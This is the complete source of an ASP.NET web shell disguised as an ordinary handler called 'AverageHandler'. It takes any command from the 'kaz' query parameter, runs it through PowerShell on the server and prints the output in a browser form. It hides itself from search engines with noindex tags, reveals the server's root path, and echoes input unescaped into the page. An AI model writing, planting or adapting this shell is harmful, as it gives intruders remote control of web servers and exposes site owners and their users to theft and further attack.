<% @ webhandler language="C#" class="AverageHandler" %>
using System;
using System.Web;
using System.Diagnostics;
using System.IO;

public class AverageHandler : IHttpHandler
{
  public bool IsReusable
  {
    get { return true; }
  }
  public void ProcessRequest(HttpContext ctx)
  {
ctx.Response.Headers.Add("X-Robots-Tag", "noindex, nofollow");
    Uri url = new Uri(HttpContext.Current.Request.Url.Scheme + "://" +   HttpContext.Current.Request.Url.Authority + HttpContext.Current.Request.RawUrl);
    string command = HttpUtility.ParseQueryString(url.Query).Get("kaz");
ctx.Response.Write("<meta name='robots' content='noindex, nofollow'>");
    ctx.Response.Write(HttpContext.Current.Server.MapPath("/"));
    ctx.Response.Write("<br><br><form method='GET'>~kaz# <input name='kaz' value='" + command + "' style='height:30px;width:800px;' placeholder='Enter command here'><input type='submit' value='Run'></form>");
    ctx.Response.Write("<hr>");
    ctx.Response.Write("<pre>");
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "powershell.exe";
    psi.Arguments = "-Command " + command;
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    StreamReader stmrdr = p.StandardOutput;
    string s = stmrdr.ReadToEnd();
    stmrdr.Close();
    ctx.Response.Write(System.Web.HttpUtility.HtmlEncode(s));
    ctx.Response.Write("</pre>");
    ctx.Response.Write("<hr>");
 }
}
